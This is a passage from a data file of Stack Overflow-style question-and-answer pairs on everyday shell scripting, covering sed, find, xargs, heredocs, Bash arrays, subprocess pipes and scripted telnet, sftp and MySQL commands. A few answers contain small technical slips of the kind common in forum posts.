    "How to get percentage of processor use with bash?": "Processor use or utilization is a measurement over time. One way to measure utilization in % is by computation over two successive reads of /proc/stat. A simple common bash script to compute the percentage is:\n#!/bin/bash\n\n# Read /proc/stat file (for first datapoint)\nread cpu user nice system idle iowait irq softirq steal guest< /proc/stat\n\n# compute active and total utilizations\ncpu_active_prev=$((user+system+nice+softirq+steal))\ncpu_total_prev=$((user+system+nice+softirq+steal+idle+iowait))\n\nusleep 50000\n\n# Read /proc/stat file (for second datapoint)\nread cpu user nice system idle iowait irq softirq steal guest< /proc/stat\n\n# compute active and total utilizations\ncpu_active_cur=$((user+system+nice+softirq+steal))\ncpu_total_cur=$((user+system+nice+softirq+steal+idle+iowait))\n\n# compute CPU utilization (%)\ncpu_util=$((100*( cpu_active_cur-cpu_active_prev ) / (cpu_total_cur-cpu_total_prev) ))\n\nprintf \" Current CPU Utilization : %s\\n\" \"$cpu_util\"\n\nexit 0\nuse/output:\n$ bash procstat-cpu.sh\n Current CPU Utilization : 10\noutput over 5 iterations:\n$ ( declare -i cnt=0; while [ \"$cnt\" -lt 5 ]; do bash procstat-cpu.sh; ((cnt++)); done )\n Current CPU Utilization : 20\n Current CPU Utilization : 18\n Current CPU Utilization : 18\n Current CPU Utilization : 18\n Current CPU Utilization : 18",
    "How to limit shell script execution time?": "I'm responding by myself just because none answered.\n0 * * * * timeout -s 9 3540 /path/to/your_command.sh\nwill send a SIGINT to your command if it hasn't completed in 59 minutes.",
    "What is the difference between <EOF and <'EOF' in shell heredocs?": "The difference is that in this version:\n<<EOF\n...\nEOF\nthe ... functions roughly as a double-quoted string, performing parameter-expansions and command-substitutions and so on (specifically, in your case, replacing $0 with the value of $0), whereas in this version:\n<<'EOF'\n...\nEOF\nthe ... functions roughly as a single-quoted string, and no such expansions are performed.\n(See \u00a73.6.6 \"Here Documents\" in the Bash Reference Manual.)",
    "How to get the status of command run by system()": "If a == -1, the call has failed. Otherwise, the exit code is WEXITSTATUS(a).\nTo quote man 3 system:\nRETURN VALUE\n       The value returned is -1 on  error  (e.g.   fork(2)  failed),  and  the\n       return  status  of the command otherwise.  This latter return status is\n       in the format specified in wait(2).  Thus, the exit code of the command\n       will  be  WEXITSTATUS(status).   In case /bin/sh could not be executed,\n       the exit status will be that of a command that does exit(127).\n\n       If the value of command is NULL, system() returns non-zero if the shell\n       is available, and zero if not.",
    "replace a string in file using shell script": "If you are using a newer version of sed you can use -i to read from and write to the same file. Using -i you can specify a file extension so a backup will be made, incase something went wrong. Also you don't need to use the -e flag unless you are using multiple commands\nsed -i.bak \"s/${line}/${rep}/g\" /root/new_scripts/a.conf\nI have just noticed that as the variables you are using are quoted strings you may want to use single quotes around your sed expression. Also your string contains a forward slash, to avoid any errors you can use a different delimiter in your sed command (the delimiter doesn't need to be a slash):\nsed -i.bak 's|${line}|${rep}|g' /root/new_scripts/a.conf",
    "Is it possible to use output redirections from a cmd file using start?": "Yes it is possible to redirect output using start wait command using the /B switch.\nstart /B /wait myprog.exe >> output.log\nIf you need to break in you will have to use Ctrl+Break, Ctrl+C will be ignored. Hope this helps.",
    "How can I get and format yesterday's date on the command line?": "GNU date:\ndate --date='yesterday' '+%Y%m%d'",
    "Hyper Terminal: zsh: command not found: hyper": "I had this problem too. After some tinkering, this command worked for me (assuming you have the hyper app in the mac applications folder):\nsudo ln -s \"/Applications/Hyper.app/Contents/Resources/bin/hyper\" /usr/local/bin/hyper\nI used this answer from another question about how to get Sublime Text's zsh command working.",
    "right text align - bash": "Try:\nprintf \"%40.40s\\n\" \"$line\"\nThis will make it right-aligned with width 40. If you want no truncation, drop .40 (thanks Dennis!):\nprintf \"%40s\\n\" \"$line\"\nFor example:\nprintf \"%5.5s\\n\" abc\nprintf \"%5.5s\\n\" abcdefghij\nprintf \"%5s\\n\" abc\nprintf \"%5s\\n\" abcdefghij\nwill print:\n  abc\nabcde\n  abc\nabcdefghij",
    "Which is faster, 'find -exec' or 'find | xargs -0'?": "The xargs version is dramatically faster with a lot of files than the -exec version as you posted it, this is because rm is executed once for each file you want to remove, while xargs will lump as many files as possible together into a single rm command.\nWith tens or hundreds of thousands of files, it can be the difference between a minute or less versus the better part of an hour.\nYou can get the same behavior with -exec by finishing the command with a \"+\" instead of \"\\;\". This option is only available in newer versions of find.\nThe following two are roughly equivalent:\nfind . -print0 | xargs -0 rm\nfind . -exec rm \\{} +\nNote that the xargs version will still run slightly faster (by a few percent) on a multi-processor system, because some of the work can be parallelized. This is particularly true if a lot of computation is involved.",
    "How to discover the machine type?": "arch ; uname -a\narch is the standard way to get the name of the CPU instruction set. uname -a gets a bunch of stuff about the OS. uname withouth the a gets the OS name.\nHowever programmatically speaking, the equivalent to arch is uname -m.",
    "Linux - Linebreak in IPython": "I just came across a solution, posted by Kenneth Falck: IPython newlines with ^V^J\nWhile editing a multiline code block use Ctrl+V CTRL+J",
    "How to skip first line of a file and read the remaining lines as input of a C program?": "Erm...\ntail -n +2 a.csv | ./myProgram",
    "How can I execute shell command with a | pipe in it": "Call with shell=True argument. For example,\nimport subprocess\n\nsubprocess.call('grep -r PASSED *.log | sort -u | wc -l', shell=True)\nHard way\nimport glob\nimport subprocess\n\ngrep = subprocess.Popen(['grep', '-r', 'PASSED'] + glob.glob('*.log'), stdout=subprocess.PIPE)\nsort = subprocess.Popen(['sort', '-u'], stdin=grep.stdout, stdout=subprocess.PIPE)\nexit_status = subprocess.call(['wc', '-l'], stdin=sort.stdout)\nSee Replacing shell pipeline.",
    "How to find out the date of the last Saturday in Linux shell script or python?": "$ date +\"%b-%d-%Y\" -d \"last saturday\"\nJul-13-2013",
    "Ever try to delete files with unix shell find? Use the -delete option": "Here's how to do it with the -delete option!\nUse the find command option -delete:\nfind . -name '*.pyc' -delete\nOf course, do try a dry run without the -delete, to see if you are going to delete what you want!!! Those computers do run so darn fast! ;-)",
    "SFTP bash shell script to copy the file from source to destination": "In a simple case such as this, you could use scp instad of sftp and specify the files to copy on the command line:\n scp $localpath/* username@10.42.255.209:/$remotepath/\nBut if you would rather want to issue sftp commands, then sftp can read commands from its stdin, so you can do:\n  echo \"put $localpath/* $remotepath\" | sftp username@10.42.255.209\nOr you can use a here document to pass data as stdin to sftp, which might be easier if you want to run several sftp commands:\nsftp username@10.42.255.209 << EOF\nput $localpath/fileA $remotepath/\nput $localpath/fileB $remotepath/\nEOF\nFinally, you could place the sftp commands in a separate file, say sftp_commands.txt , and have sftp execute those commands using its -b flag:\n sftp -b ./sftp_commands.txt username@10.42.255.209",
    "How to join lines not starting with specific pattern to the previous line in UNIX?": "With sed:\nsed ':a;N;/\\nThese/!s/\\n/ /;ta;P;D' infile\nresulting in\nThese are leaves.\nThese are branches.\nThese are greenery which gives oxygen, provides control over temperature and maintains cleans the air.\nThese are tigers\nThese are bears and deer and squirrels and other animals.\nThese are something you want to kill Which will see you killed in the end.\nThese are things you must to think to save your tomorrow.\nHere is how it works:\nsed '\n:a                   # Label to jump to\nN                    # Append next line to pattern space\n/\\nThese/!s/\\n/ /    # If the newline is NOT followed by \"These\", append\n                     # the line by replacing the newline with a space\nta                   # If we changed something, jump to label\nP                    # Print part until newline\nD                    # Delete part until newline\n' infile\nThe N;P;D is the idiomatic way of keeping multiple lines in the pattern space; the conditional branching part takes care of the situation where we append more than one line.\nThis works with GNU sed; for other seds like the one found in Mac OS, the oneliner has to be split up so branching and label are in separate commands, the newlines may have to be escaped, and we need an extra semicolon:\nsed -e ':a' -e 'N;/'$'\\n''These/!s/'$'\\n''/ /;ta' -e 'P;D;' infile\nThis last command is untested; see this answer for differences between different seds and how to handle them.\nAnother alternative is to enter the newlines literally:\nsed -e ':a' -e 'N;/\\\nThese/!s/\\\n/ /;ta' -e 'P;D;' infile\nBut then, by definition, it's no longer a one-liner.",
    "\"sh: : unknown operand\" in Yocto": "The problem seems to be that $(echo $y) is expanding to an empty string, and then [[ isn't handling it correctly. The solution to that would be to quote the command substitution like\n[[ \"$(echo \"$y\")\" != '' ]] && echo true\nthough it's probably better still to use printf than echo so you might do it as\n[[ \"$(printf '%s' \"$y\")\" != '' ]] && echo true\njust in case $y might end up with special characters that can trip up echo or similar",
    "Read file into String and do a loop in Expect Script": "The code should read the contents of the two files into lists of lines, then iterate over them. It ends up like this:\n# Set up various other variables here ($user, $password)\n\n# Get the list of hosts, one per line #####\nset f [open \"host.txt\"]\nset hosts [split [read $f] \"\\n\"]\nclose $f\n\n# Get the commands to run, one per line\nset f [open \"commands.txt\"]\nset commands [split [read $f] \"\\n\"]\nclose $f\n\n# Iterate over the hosts\nforeach host $hosts {\n    spawn ssh $user@host\n    expect \"password:\"\n    send \"$password\\r\"\n\n    # Iterate over the commands\n    foreach cmd $commands {\n        expect \"% \"\n        send \"$cmd\\r\"\n    }\n\n    # Tidy up\n    expect \"% \"\n    send \"exit\\r\"\n    expect eof\n    close\n}\nYou could refactor this a bit with a worker procedure or two, but that's the basic idea.",
    "Print on terminal and into file simultaneously?": "Pipe your output to the tee command.\nExample:\n[me@home]$ echo hello | tee out.txt\nhello\n[me@home]$ cat out.txt \nhello\nNote that the stdout of echo is printed out as well as written to the file specified by thr tee command.",
    "Resize a list of images in line command": "If you want to resize them to 800x600:\nfor file in *.jpg; do convert -resize 800x600 -- \"$file\" \"${file%%.jpg}-resized.jpg\"; done\n(works in bash)",
    "Why is \"echo foo | read a ; echo $a\" not working as expected?": "Due to the piping the read is executed in its own subshell.\necho foo | while read a; do echo $a; done\nwill do what you expect it to.",
    "How to delete all subdirectories with a specific name": "If find finds the correct directories at all, these should work:\nfind dir -type d -name \"subdir1\" -exec echo rm -rf {} \\; \nor\nfind dir -type d -name \"subdir1\" -exec echo rm -rf {} +\n(the echo is there for verifying the command hits the files you wanted, remove it to actually run the rm and remove the directories.)\nBoth piping to xargs and to while read have the downside that unusual file names will cause issues. Also, find -delete will only try to remove the directories themselves, not their contents. It will fail on any non-empty directories (but you should at least get errors).\nWith xargs, spaces separate words by default, so even file names with spaces will not work. read can deal with spaces, but in your command it's the unquoted expansion of $tar that splits the variable on spaces.\nIf your filenames don't have newlines or trailing spaces, this should work, too:\nfind ... | while read -r x ; do rm -rf \"$x\" ; done",
    "I got 'syntax error: \"(\" unexpected' (expecting \"done\") [duplicate]": "Your error message is from Dash, probably because you ran sh filename.\nTo run a script with Bash, use bash filename (or ./filename).",
    "Telnet to login with username and password to mail Server": "First of all, you can use eval:\neval \"{ echo user_name; sleep 1; echo pass; sleep 1; echo '?'; sleep 5; }\" | telnet host_address\nMake sure to replace user_name, pass, ? which is the command you want to run and host_address where your telnet host is listening; for me it is a local IP.\nIt\u2019s surprisingly easy to script a set of command and pipe them into the telnet application. All you need to do is something like this:\n(echo commandname;echo anothercommand) | telnet host_address\nThe only problem is the nagging login that you have to get through\u2026 it doesn\u2019t show up right away. So if you pipe in an \u201cecho admin\u201d and then \u201cecho password,\u201d it will happen too quickly and won\u2019t be sent to the server. The solution? Use the sleep command!\nAdding in a couple of sleep 3 commands, to wait three seconds, solves the problem. First we\u2019ll echo the username and password, and then we\u2019ll echo the reboot command, and each time we\u2019ll wait three seconds between. The final command will reboot the server immediately:\n(sleep 3;echo admin;sleep 3;echo mypassword;sleep 3;echo system reboot;sleep 3;) | telnet host_address\nYou can put this into a shell script and run it whenever you want. Or you can add it to your cron like this (on OS X or Linux):\ncrontab -e\nAdd this line somewhere:\n1 7 * * * (sleep 3;echo admin;sleep 3;echo mypassword;sleep 3;echo system reboot;sleep 3;) | telnet host_address\nThis will reboot your router at 7:01 AM each morning.",
    "What do \\S, \\W, \\D stand for in regex?": "\\W is the opposite of \\w and \\D is the opposite of \\d.\nIt's just like \\S is the opposite of \\s.\n\\W and \\D respectively will match what \\w and \\d respectively don't match.\nYou can have a look at this site for some more explanation.\n\\w typically matches [A-Za-z0-9_] (ignoring the foreign characters)\n\\W thus matches [^A-Za-z0-9_]\nAnd since\n\\d typically matches [0-9] (ignoring the foreign digits)\n\\D thus matches [^0-9]",
    "Why does \"uniq\" count identical words as different?": "Try to sort first:\ncat .temp_occ | sort| uniq -c | sort -k1,1nr -k2 > distribution.txt",
    "piping in shell via Python subprocess module": "You can pass the shell=True argument to execute the plain shell command:\nimport subprocess\nsubprocess.check_output('ps -eo pcpu,pid,user,args | sort -k 1 -r | head -3',\n                        shell=True)\nAlternatively, use the sorting options of ps and Python's built-in string functions like this:\nraw = subprocess.check_output('ps -eo pcpu,pid,user,args --sort -pcpu')\nfirst_three_lines = list(raw.split('\\n'))[:3]",
    "Run sudo commands in Haskell": "Try readProcess from System.Process\nreadProcess :: FilePath -- command to run \n-> [String]             -- any arguments \n-> String               -- standard input \n-> IO String            -- stdout \nreadProcess forks an external process, reads its standard output strictly, blocking until the process terminates, and returns the output string.\nRun it like this:\nreadProcess \"/usr/bin/sudo\" (\"-S\":someProgram) (passwort++\"\\n\")\nThis executes sudo with the options -S and the program. -S is needed to read the password from stdin. The password must finish with a newline, so the program adds one.",
    "Running shell commands without a shell window": "I imagine your observation is limited to Windows, since that, I believe, is the only platform on which you'll get that \"console flash\" issue. If so, then the docs offer the following semi-helpful paragraph:\nThe startupinfo and creationflags, if given, will be passed to the underlying CreateProcess() function. They can specify things such as appearance of the main window and priority for the new process. (Windows only)\nUnfortunately the Python online docs do not reproduce the relevant portion of the Windows API docs, so you have to locate those elsewhere, e.g. starting here on MSDN which leads you here for the creationflags, and specifically to\nCREATE_NO_WINDOW\n0x08000000\nThe process is a console application that is being run without a console window. Therefore, the console handle for the application is not set.\nSo, adding creationflags=0x08000000 to your Popen call should help (unfortunately I have no Windows-running machine on which to try this out, so you'll have to try it yourself).",
    "Combining 2 .csv files by common column": "sort -t , -k index1 file1 > sorted1\nsort -t , -k index2 file2 > sorted2\njoin -t , -1 index1 -2 index2 -a 1 -a 2 sorted1 sorted2",
    "How can I test if a list of files exist?": "In cmd.exe, the FOR /F %variable IN ( filename ) DO command should give you what you want. This reads the contents of filename (and they could be more than one filenames) one line at a time, placing the line in %variable (more or less; do a HELP FOR in a command prompt). If no one else supplies a command script, I will attempt.\nEDIT: my attempt for a cmd.exe script that does the requested:\n@echo off\nrem first arg is the file containing filenames\nrem second arg is the target directory\n\nFOR /F %%f IN (%1) DO IF EXIST %2\\%%f ECHO %%f exists in %2\nNote, the script above must be a script; a FOR loop in a .cmd or .bat file, for some strange reason, must have double percent-signs before its variable.\nNow, for a script that works with bash|ash|dash|sh|ksh :\nfilename=\"${1:-please specify filename containing filenames}\"\ndirectory=\"${2:-please specify directory to check}\nfor fn in `cat \"$filename\"`\ndo\n    [ -f \"$directory\"/\"$fn\" ] && echo \"$fn\" exists in \"$directory\"\ndone",
    "Get CPU usage in shell script?": "Use top -b (and other switches if you want different outputs). It will just dump to stdout instead of jumping into a curses window.",
    "How to check if a homebrew service is switched on or not": "brew services list gives the status of the services. so something like brew services list | grep elastiscearch | awk '{ print $2}' should return the status of the elastic search service, whether started or stopped",
    "Is it secure to use a password argument in a Windows command?": "Windows historically didn't save command history between sessions, only within the session. This was true for the command prompt and for PowerShell.\nAs Bill Stewart pointed out, Windows PowerShell on Windows 10 and Windows 2016 includes PSReadline by default, which does save your command history between sessions. You can see this by looking at the file here: (Get-PSReadLineOption).HistorySavePath.\nBut even if it's set to off, or on an OS version that didn't offer the option, that doesn't mean entering a plaintext password as an argument is a good idea.\nIf you must offer that, you should also have a way to have the program prompt at run time.\nFor PowerShell and other .Net applications, you have another issue with accepting plaintext passwords: they linger in memory and there's no good way to explicitly clear them.\nThis issue is two-fold: strings are immutable in .Net, which means you cannot just modify the string with nulls or random characters to clear it in memory (you will actually be creating a brand new string), and on top of that you cannot control when a specific object will handled by garbage collection, so you can't explicitly remove it.\nThis is why the SecureString class exists, but not everything can use this.\nIn PowerShell, there is a PSCredential object which stores a user name in plain text and a password as a SecureString. This should always be used in PowerShell, and should be the preferred argument type (in lieu of a separate user name and password).\nMost commands in PowerShell that require a credential take it as this type of object.\nYou can retrieve a plaintext version of the password easily with this object as well. Doing so then puts that into a managed string and you get the risks I mentioned above.\nIn my opinion though, it is still preferable to use a PSCredential object in these situations, right up until the point you need the plaintext version. It helps to maintain the standardization of this type in both a built-in/'official' capacity, as well as in user-defined commands.\nThis type is also easily serializable with Export-Clixml into a form that is encrypted. This can give you a really nice way of providing an automated option to use stored credentials in scripts, with nothing in plaintext, and no prompting or user intervention required.",
    "Iterate over $PATH variable using shell script": "You can use read with delimiter set as :\nwhile read -d ':' p; do\n   echo \"$p\"\ndone <<< \"$PATH:\"",
    "How to get the complete calling command of a BASH script from inside the script (not just the arguments)": "You can try the following:\nmyInvocation=\"$(printf %q \"$BASH_SOURCE\")$((($#)) && printf ' %q' \"$@\")\"\n$BASH_SOURCE refers to the running script (as invoked), and $@ is the array of arguments; (($#)) && ensures that the following printf command is only executed if at least 1 argument was passed; printf %q is explained below.\nWhile this won't always be a verbatim copy of your command line, it'll be equivalent - the string you get is reusable as a shell command.\nchepner points out in a comment that this approach will only capture what the original arguments were ultimately expanded to:\nFor instance, if the original command was my_script $USER \"$(date +%s)\", $myInvocation will not reflect these arguments as-is, but will rather contain what the shell expanded them to; e.g., my_script jdoe 1460644812\nchepner also points that out that getting the actual raw command line as received by the parent process will be (next to) impossible. Do tell me if you know of a way.\nHowever, if you're prepared to ask users to do extra work when invoking your script or you can get them to invoke your script through an alias you define - which is obviously tricky - there is a solution; see bottom.\nNote that use of printf %q is crucial to preserving the boundaries between arguments - if your original arguments had embedded spaces, something like $0 $* would result in a different command.\nprintf %q also protects against other shell metacharacters (e.g., |) embedded in arguments.\nprintf %q quotes the given argument for reuse as a single argument in a shell command, applying the necessary quoting; e.g.:\n $ printf %q 'a |b'\n a\\ \\|b\na\\ \\|b is equivalent to single-quoted string 'a |b' from the shell's perspective, but this example shows how the resulting representation is not necessarily the same as the input representation.\nIncidentally, ksh and zsh also support printf %q, and ksh actually outputs 'a |b' in this case.\nIf you're prepared to modify how your script is invoked, you can pass $BASH_COMMANDas an extra argument: $BASH_COMMAND contains the raw[1] command line of the currently executing command.\nFor simplicity of processing inside the script, pass it as the first argument (note that the double quotes are required to preserve the value as a single argument):\nmy_script \"$BASH_COMMAND\" --option1 value --option2\nInside your script:\n# The *first* argument is what \"$BASH_COMMAND\" expanded to,\n# i.e., the entire (alias-expanded) command line.\nmyInvocation=$1    # Save the command line in a variable...\nshift              # ... and remove it from \"$@\".\n\n# Now process \"$@\", as you normally would.\nUnfortunately, there are only two options when it comes to ensuring that your script is invoked this way, and they're both suboptimal:\nThe end user has to invoke the script this way - which is obviously tricky and fragile (you could however, check in your script whether the first argument contains the script name and error out, if not).\nAlternatively, provide an alias that wraps the passing of $BASH_COMMAND as follows:\nalias my_script='/path/to/my_script \"$BASH_COMMAND\"'\nThe tricky part is that this alias must be defined in all end users' shell initialization files to ensure that it's available.\nAlso, inside your script, you'd have to do extra work to re-transform the alias-expanded version of the command line into its aliased form:\n# The *first* argument is what \"$BASH_COMMAND\" expanded to,\n# i.e., the entire (alias-expanded) command line.\n# Here we also re-transform the alias-expanded command line to\n# its original aliased form, by replacing everything up to and including\n# \"$BASH_COMMMAND\" with the alias name.\nmyInvocation=$(sed 's/^.* \"\\$BASH_COMMAND\"/my_script/' <<<\"$1\")\nshift              # Remove the first argument from \"$@\".\n\n# Now process \"$@\", as you normally would.\nSadly, wrapping the invocation via a script or function is not an option, because the $BASH_COMMAND truly only ever reports the current command's command line, which in the case of a script or function wrapper would be the line inside that wrapper.\n[1] The only thing that gets expanded are aliases, so if you invoked your script via an alias, you'll still see the underlying script in $BASH_COMMAND, but that's generally desirable, given that aliases are user-specific.\nAll other arguments and even input/output redirections, including process substitutiions <(...) are reflected as-is.",
    "Importing .csv file to sqlite3 db table": "After much studies and discussion, I found an answer that is working properly,\necho -e \".separator \",\"\\n.import /home/aj/ora_exported.csv qt_exported2\" | sqlite3 testdatabase.db\nthe main thing is, that I needed to include the path of the .csv file in the import statement.",
    "How to test if a variable exists and has been initialized": "Use parameter expansion:\n: ${var:?}\nRemove the colon if the empty string is a valid value (i.e., you only want to test for definedness).\n: ${var?}\nIf you don't want the script to stop on the problem, you can use\nif [[ ${var:+1} ]] ; then\n    # OK...\nelse\n    echo Variable empty or not defined. >&2\nfi\nDocumented under Parameter Expansion in man bash:\nWhen not performing substring expansion, using the forms documented below (e.g., :-), bash tests for a parameter that is unset or null. Omitting the colon results in a test only for a parameter that is unset.\n${parameter:?word}\nDisplay Error if Null or Unset. If parameter is null or unset, the expansion of word (or a message to that effect if word is not present) is written to the standard error and the shell, if it is not interactive, exits. Otherwise, the value of parameter is substituted.\n${parameter:+word}\nUse Alternate Value. If parameter is null or unset, nothing is substituted, otherwise the expansion of word is substituted.",
    "Tmux create window failed: index in use: 0": "chepner's answer is correct, but you can also avoid specifying window numbers by appending windows with the -a option:\ntmux new-window -a -t server-connections -n 't-u14-nickpl' 'ssh T-U14-NickPL'\ntmux new-window -a -t server-connections -n 't-u12-dev1' 'ssh T-U12-Dev1'",
    "shell script to download files from remote machine using ftp": "It would be much simpler with wget:\nwget ftp://name:123@ftp.flowers.com/flower/rose/red",
    "Combine multiple sed commands [duplicate]": "Use the -e option (if using GNU sed). From the manual:\ne [command] This command allows one to pipe input from a shell command into pattern space. Without parameters, the e command executes the command that is found in pattern space and replaces the pattern space with the output; a trailing newline is suppressed.\nIf a parameter is specified, instead, the e command interprets it as a command and sends its output to the output stream. The command can run across multiple lines, all but the last ending with a back-slash.\nIn both cases, the results are undefined if the command to be executed contains a NUL character.\nNote that, unlike the r command, the output of the command will be printed immediately; the r command instead delays the output to the end of the current cycle.\nSo in your case you could do:\ncat tmp.txt | grep '<td>[0-9]*.[0-9]' \\\n| sed -e 's/[\\t ]//g' \\\n-e \"s/<td>//g\" \\\n-e \"s/kB\\/s\\((.*)\\)//g\" \\\n-e \"s/<\\/td>//g\" > traffic.txt\nYou can also write it in another way as:\ngrep \"<td>.*</td>\" tmp.txt | sed 's/<td>\\([0-9.]\\+\\).*/\\1/g'\nThe \\+ matches one or more instances, but it does not work on non-GNU versions of sed. (Mac has BSD, for example)\nWith help from @tripleee's comment below, this is the most refined version I could get which will work on non-GNU versions of sed as well:\nsed -n 's/<td>\\([0-9]*.[0-9]*\\).*/\\1/p' tmp.txt\nAs a side note, you could also simply pipe the outputs through each sed instead of saving each output, which is what I see people generally do for ad-hoc tasks:\n  cat tmp.txt | grep '<td>[0-9]*.[0-9]' \\\n    | sed -e 's/[\\t ]//g' \\\n    | sed \"s/<td>//g\" \\\n    | sed \"s/kB\\/s\\((.*)\\)//g\" \\\n    | sed \"s/<\\/td>//g\" > traffic.txt\nThe -e option is more efficient, but the piping option is more convenient I guess.",
    "save a text file in a variable in bash": "The issue is that you have an extra space. Assignment requires zero spaces between the = operator. However, with bash you can use:\nTEXT=$(<configure.ac)\nYou'll also want to make sure you quote your variables to preserve newlines\nCHANGED_TEXT=\"${TEXT//ProjectName/$PROJECT_NAME}\"\necho \"$CHANGED_TEXT\"",
    "I installed fish shell on my computer and now I can't open the VS code terminal [closed]": "I had this same problem. The issue is that VSC only looks for shells in /usr/bin by default. I copied the default terminal settings and updated fish to where brew installs it: /usr/local/bin\n\"terminal.integrated.profiles.osx\": {\n    \"bash\": {\n        \"path\": \"bash\",\n        \"args\": [\n            \"-l\"\n        ],\n        \"icon\": \"terminal-bash\"\n    },\n    \"zsh\": {\n        \"path\": \"zsh\",\n        \"args\": [\n            \"-l\"\n        ]\n    },\n    \"fish\": {\n        \"path\": \"/usr/local/bin/fish\", // overriding\n        \"args\": [\n            \"-l\"\n        ]\n    }\n},\nThis should be the same for other OSes, you'll just want linux or windows instead of osx.\nTo get to that setting, open up your settings (cmd comma on mac or ctrl comma elsewhere), search for terminal profiles: and click edit in settings.json. It should take you right to the correct spot to paste in these profiles.",
    "Updating data in mysql db from bash script": "Found the answer after some trial and error.\nJust in case anybody else is looking to do the same thing it's :\n#!/bin/bash\n\nmysql -u username -puserpass dbname -e \"UPDATE mytable SET mycolumn = 'myvalue' WHERE id='myid'\";\nNote that there is no space between the -p and your password -puserpass if you put a space there -p userpass it will prompt you for the password.\nHope it helps somebody ;)",
    "Arrays in Shell Script, not Bash": "a=\"abc 123 def\"\n\nset -- $a\nwhile [ -n \"$1\" ]; do\n    echo $1\n    shift\ndone\nOutput via busybox 1.27.2 ash:\nabc\n123\ndef",
    "How to avoid a shell script exiting on failure for particular commands": "command1\ncommand2 || true\ncommand3",
    "How do I test a function with gets.chomp in it?": "You could create a pipe and assign its \"read end\" to $stdin. Writing to the pipe's \"write end\" then simulates user input.\nHere's an example with a little helper method with_stdin for setting up the pipe:\nrequire 'test/unit'\n\nclass View\n  def read_user_input\n    gets.chomp\n  end\nend\n\nclass ViewTest < Test::Unit::TestCase\n  def test_read_user_input\n    with_stdin do |user|\n      user.puts \"user input\"\n      assert_equal(View.new.read_user_input, \"user input\")\n    end\n  end\n\n  def with_stdin\n    stdin = $stdin             # remember $stdin\n    $stdin, write = IO.pipe    # create pipe assigning its \"read end\" to $stdin\n    yield write                # pass pipe's \"write end\" to block\n  ensure\n    write.close                # close pipe\n    $stdin = stdin             # restore $stdin\n  end\nend",
    "how to ping each ip in a file?": "You need to use the option -n1 with xargs to pass one IP at time as ping doesn't support multiple IPs:\n$ cat ips | xargs -n1 ping -c 2\nDemo:\n$ cat ips\n127.0.0.1\ngoogle.com\nbbc.co.uk\n\n$ cat ips | xargs echo ping -c 2\nping -c 2 127.0.0.1 google.com bbc.co.uk\n\n$ cat ips | xargs -n1 echo ping -c 2\nping -c 2 127.0.0.1\nping -c 2 google.com\nping -c 2 bbc.co.uk\n\n# Drop the UUOC and redirect the input\n$ xargs -n1 echo ping -c 2 < ips\nping -c 2 127.0.0.1\nping -c 2 google.com\nping -c 2 bbc.co.uk",
    "Replace substring with sed": "Use: sed 's/:.*/:replaceword/'\n$ echo test:blabla | sed 's/:.*/:replaceword/'\ntest:replaceword\nOr for the situation test test:blabla test where you only want to replace the word following : use sed 's/:[^ ]*/:replaceword/':\n$ echo \"test test:blabla test\" | sed 's/:[^ ]*/:replaceword/'\ntest test:replaceword test\n\n# Use the g flag for multiple matches on a line\n$ echo \"test test:blabla test test:blah2\" | sed 's/:[^ ]*/:replaceword/g'\ntest test:replaceword test test:replaceword",
    "concatenate inputs in bash script [duplicate]": "function concatenate_args\n{\n    string=\"\"\n    for a in \"$@\" # Loop over arguments\n    do\n        if [[ \"${a:0:1}\" != \"-\" ]] # Ignore flags (first character is -)\n        then\n            if [[ \"$string\" != \"\" ]]\n            then\n                string+=\"_\" # Delimeter\n            fi\n            string+=\"$a\"\n        fi\n    done\n    echo \"$string\"\n}\n\n# Usage:\nargs=\"$(concatenate_args \"$@\")\"",
    "Shell Script and spaces in path": "Be sure to double-quote anything that may contain spaces:\nBASEDIR=\"`dirname $0`\"\nBASEDIR=\"`(cd \\\"$BASEDIR\\\"; pwd)`\"",
    "Manually iterating a line of a file | bash": "Instead of using a for loop to read through the file you should maybe read through the file like so.\n#!bin/bash\n\nwhile read line\ndo\n    do_something_to_line($line)\ndone < \"your.file\"",
    "Run a script over multiple files in unix": "find . -name \"filename*\" -exec perl myscript.pl '{}' \\; ",
    "Tricky brace expansion in shell": "... There is so much wrong with using eval. What you're asking is only possible with eval, BUT what you might want is easily possible without having to resort to bash bug-central.\nUse arrays! Whenever you need to keep multiple items in one datatype, you need (or, should use) an array.\nTEST=(quick man strong)\ntouch \"${TEST[@]/%/ly}\"\nThat does exactly what you want without the thousand bugs and security issues introduced and concealed in the other suggestions here.\nThe way it works is:\n\"${foo[@]}\": Expands the array named foo by expanding each of its elements, properly quoted. Don't forget the quotes!\n${foo/a/b}: This is a type of parameter expansion that replaces the first a in foo's expansion by a b. In this type of expansion you can use % to signify the end of the expanded value, sort of like $ in regular expressions.\nPut all that together and \"${foo[@]/%/ly}\" will expand each element of foo, properly quote it as a separate argument, and replace each element's end by ly.",
    "how can I enter multiple lines in an OSX terminal? [duplicate]": "End your line with a backslash (\\), hit Enter, and continue typing on the next line.\nKeep in mind that if you need spaces between the parts of your command, you need to enter them explicitly, e.g.:\nls \\\n-la",
    "Unshift array element in Bash script": "If your array is contiguous, you can use the \"${array[@]}\" syntax to construct a new array:\narray=('a' 'b' 'c');\necho \"${array[@]}\"; # prints: a b c\narray=('d' \"${array[@]}\");\necho \"${array[@]}\"; # prints: d a b c\nAs chepner mentions, the above method will collapse indices of sparse arrays:\narray=([5]='b' [10]='c');\ndeclare -p array; # prints: declare -a array='([5]=\"b\" [10]=\"c\")'\narray=('a' \"${array[@]}\");\ndeclare -p array; # prints: declare -a array='([0]=\"a\" [1]=\"b\" [2]=\"c\")'\n(Fun fact: PHP does that too - but then again, it's PHP :P)\nIf you need to work with sparse arrays, you can iterate over the indices of the array manually (${!array[@]}) and increase them by one (with $((...+1))):\nold=([5]='b' [10]='c');\nnew=('a');\nfor i in \"${!old[@]}\"; do\n    new[\"$(($i+1))\"]=\"${old[$i]}\";\ndone;\ndeclare -p new; # prints: declare -a new='([0]=\"a\" [6]=\"b\" [11]=\"c\")'",
    "bash \"echo\" including \">\" in the middle creating file - please explain": "In bash, redirections can occur anywhere in the line (but you shouldn't do it! --- see the bash-hackers tutorial). Bash takes the >5 as a redirection, creates output file 5, and then processes the rest of the arguments. Therefore, echo 2*3 is a valid inequality happens, which gives you the output you see in the output file 5.\nWhat you probably want is\necho \"2*3>5 is a valid inequality\"\nor\necho '2*3>5 is a valid inequality'\n(with single-quotes), either of which will give you the message you specify as a printout on the command line. The difference is that, within \"\", variables (such as $foo) will be filled in, but not within ''.\nEdit: The bash man page says that the\nredirection operators may precede or appear anywhere within a simple command or may follow a command. Redirections are processed in the order they appear, from left to right.",
